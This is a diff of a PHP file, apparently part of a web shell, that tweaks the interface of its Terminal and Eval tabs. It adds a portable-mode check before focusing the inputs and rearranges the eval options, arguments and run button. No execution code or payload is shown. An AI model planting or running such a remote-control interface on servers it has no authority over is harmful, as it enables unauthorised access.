@@ -38,14 +38,14 @@ $GLOBALS['module']['explorer']['content'] = $explorer_content;
 $GLOBALS['module']['terminal']['id'] = "terminal";
 $GLOBALS['module']['terminal']['title'] = "Terminal";
 $GLOBALS['module']['terminal']['js_ontabselected'] = "
-if($('#terminalOutput').html()=='') $('#terminalInput').focus();";
+if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();";
 $GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".get_cwd()."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
 
 
 $GLOBALS['module']['eval']['id'] = "eval";
 $GLOBALS['module']['eval']['title'] = "Eval";
 $GLOBALS['module']['eval']['js_ontabselected'] = "
-if($('#evalOutput').html()=='You can also press ctrl+enter to submit') $('#evalInput').focus();";
+if((!portableMode) && ($('#evalOutput').html()=='You can also press ctrl+enter to submit')) $('#evalInput').focus();";
 $GLOBALS['module']['eval']['content'] = "
 <table class='boxtbl'>
 <thead>
@@ -53,16 +53,23 @@ $GLOBALS['module']['eval']['content'] = "
 </thead>
 <tbody>
 	<tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr>
+	
+	<tr id='evalAdditional'><td colspan='4'>
+		<input type='text' id='evalOptions' value='Options/Switches' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\">
+		<input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\">
+	</td></tr>
+	
 	<tr>
-		<td class='colFit'><input type='button' id='evalSubmit' value='run' class='button' onclick=\"eval_go();\"></td>
 		<td style='width:120px;'>
 			<select id='evalType'>
 				<option>php</option>
 			</select>
 		</td>
-		<td><input type='text' id='evalOptions' value='Options/Switches' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\"></td>
-		<td><input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\"></td>
+		<td colspan='3'>
+			<span id='evalSubmit' style='width:120px;' class='button' onclick=\"eval_go();\">run</span>	
+		</td>
 	</tr>
+	
 	<tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td</tr>
 </tbody>
 </table>
